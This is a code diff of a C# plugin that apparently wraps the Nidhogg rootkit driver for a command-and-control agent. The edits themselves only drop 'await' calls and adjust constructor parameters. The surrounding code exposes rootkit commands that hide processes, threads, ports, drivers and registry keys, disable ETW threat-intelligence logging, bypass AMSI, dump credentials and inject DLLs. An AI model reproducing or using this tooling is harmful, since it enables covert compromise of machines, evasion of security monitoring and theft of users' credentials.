@@ -14,12 +14,9 @@ namespace Agent
     {
         public string Name => "nidhogg";
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -33,7 +30,7 @@ namespace Agent
             }
             catch (NidhoggApiException e)
             {
-                await this.messageManager.WriteLine(e.Message, job.task.id, true, "error");
+                this.messageManager.WriteLine(e.Message, job.task.id, true, "error");
                 return;
             }
         }
@@ -145,12 +142,12 @@ namespace Agent
 
             if (error != NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS)
             {
-                await this.messageManager.WriteLine($"Failed to execute script: {error}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to execute script: {error}", task_id, true, "error");
                 return;
             }
 
 
-            await this.messageManager.WriteLine("Script executed succesfully", task_id, true);
+            this.messageManager.WriteLine("Script executed succesfully", task_id, true);
         }
         private async Task ModifyFileProtections(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
         {
@@ -163,7 +160,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to protect file: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to protect file: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] File protected successfully.");
@@ -174,7 +171,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unprotect file: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unprotect file: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] File unprotected successfully.");
@@ -189,7 +186,7 @@ namespace Agent
                 sb.AppendLine($"\t{file}");
             }
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyProcessProtections(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
         {
@@ -202,7 +199,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Process protected successfully.");
@@ -214,7 +211,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unprotect process: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unprotect process: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Process unprotected successfully.");
@@ -229,7 +226,7 @@ namespace Agent
                 sb.AppendLine($"\t{proc}");
             }
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyProcessVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
         {
@@ -242,7 +239,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide process: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide process: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Process hidden successfully.");
@@ -254,7 +251,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide process: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unhide process: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Process unhidden successfully.");
@@ -263,7 +260,7 @@ namespace Agent
             sb.AppendLine("Successfully modified visibility of process: " + args.id);
 
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyProcessElevation(NidhoggApi api, NidhoggArgs args, string task_id)
         {
@@ -273,12 +270,12 @@ namespace Agent
 
             if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
             {
-                await this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
                 return;
             }
 
             sb.AppendLine("Successfully elevated process: " + args.id);
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyThreadVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
         {
@@ -290,7 +287,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide thread: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide thread: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully hid thread: " + args.id);
@@ -301,12 +298,12 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide thread: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unhide thread: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unhid thread: " + args.id);
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true); ;
+            this.messageManager.WriteLine(sb.ToString(), task_id, true); ;
         }
         private async Task ModifyThreadProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
         {
@@ -318,7 +315,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to protect thread: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to protect thread: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully protected thread: " + args.id);
@@ -329,7 +326,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unprotect thread: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unprotect thread: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unprotected thread: " + args.id);
@@ -345,7 +342,7 @@ namespace Agent
             }
 
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyRegistryKeyProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
         {
@@ -357,7 +354,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to protect key: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to protect key: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully protected key: " + args.path);
@@ -368,7 +365,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unprotect key: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unprotect key: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unprotected key: " + args.path);
@@ -379,7 +376,7 @@ namespace Agent
             {
                 sb.AppendLine("\t" + val);
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyRegistryKeyVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
         {
@@ -391,7 +388,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully hid Key: " + args.path);
@@ -402,7 +399,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unhid Key: " + args.path);
@@ -414,7 +411,7 @@ namespace Agent
             {
                 sb.AppendLine("\t" + val);
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyRegistryValueProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
         {
@@ -426,7 +423,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to protect value: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to protect value: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully protected value: " + args.value + " at: " + args.path);
@@ -437,7 +434,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unprotect value: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unprotect value: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unprotected value: " + args.value + " at: " + args.path);
@@ -449,7 +446,7 @@ namespace Agent
             {
                 sb.AppendLine("\t" + val);
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyRegistryValueVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
         {
@@ -461,7 +458,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide value: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide value: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully hid value: " + args.value + " at: " + args.path);
@@ -472,7 +469,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide value: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unhide value: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unhid value: " + args.value + " at: " + args.path);
@@ -484,7 +481,7 @@ namespace Agent
             {
                 sb.AppendLine("\t" + val);
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyEtwTi(NidhoggApi api, string task_id, bool enable)
         {
@@ -493,13 +490,13 @@ namespace Agent
 
             if (err != NidhoggErrorCodes.NIDHOGG_SUCCESS)
             {
-                await this.messageManager.WriteLine($"Failed to disable etwti: {err}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to disable etwti: {err}", task_id, true, "error");
                 return;
             }
 
             sb.AppendLine(enable ? "[+] Etwti enabled" : "[+] Etwti disabled");
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggListCallbacks(NidhoggApi api, string task_id, CallbackType type)
         {
@@ -523,7 +520,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                     return;
                 }
 
@@ -535,14 +532,14 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                     return;
                 }
 
                 sb.AppendLine("[+] Succesfully unhid driver: " + args.path);
             }
  
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyAmsi(NidhoggApi api, NidhoggArgs args, string task_id)
         {
@@ -552,12 +549,12 @@ namespace Agent
             err = api.AmsiBypass(args.id);
             if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
             {
-                await this.messageManager.WriteLine($"Failed to patch: {err}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to patch: {err}", task_id, true, "error");
                 return;
             }
 
             sb.AppendLine("Success");
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyModuleVisibility(NidhoggApi api, NidhoggArgs args, string task_id)
         {
@@ -567,12 +564,12 @@ namespace Agent
 
             if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
             {
-                await this.messageManager.WriteLine($"Failed to modify module: {err}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to modify module: {err}", task_id, true, "error");
                 return;
             }
 
             sb.AppendLine("Succesfully modified module");
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyPortVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
         {
@@ -584,7 +581,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully hid port: " + args.id);
@@ -595,7 +592,7 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
+                    this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                     return;
                 }
                 sb.AppendLine("[+] Succesfully unhid port: " + args.id);
@@ -608,7 +605,7 @@ namespace Agent
                 sb.AppendLine($"\tPort: {port.Port}\t Remote:{port.Remote}\t Tcp: {port.Type}");
             }
 
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggDumpCredentials(NidhoggApi api, string task_id)
         {
@@ -622,7 +619,7 @@ namespace Agent
             (credentials, desKey) = api.DumpCredentials();
             if (credentials == null)
             {
-                await this.messageManager.WriteLine($"[-] Failed to dump credentials.", task_id, true, "error");
+                this.messageManager.WriteLine($"[-] Failed to dump credentials.", task_id, true, "error");
                 return;
             }
 
@@ -650,7 +647,7 @@ namespace Agent
                 string hexString = BitConverter.ToString(hashBytes).Replace("-", " ");
                 sb.AppendLine($"Encrypted hash: {hexString}");
             }
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         //Add support for specifying the type
         private async Task NidhoggDllInjection(NidhoggApi api, NidhoggArgs args, string task_id)
@@ -660,12 +657,12 @@ namespace Agent
             var err = api.DllInject(args.id, args.path, InjectionType.APCInjection);
             if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
             {
-                await this.messageManager.WriteLine($"Failed to inject dll: {err}", task_id, true, "error");
+                this.messageManager.WriteLine($"Failed to inject dll: {err}", task_id, true, "error");
                 return;
             }
 
             sb.AppendLine($"Succesfully injected {args.path} into {args.id}.");
-            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
+            this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
     }
 }
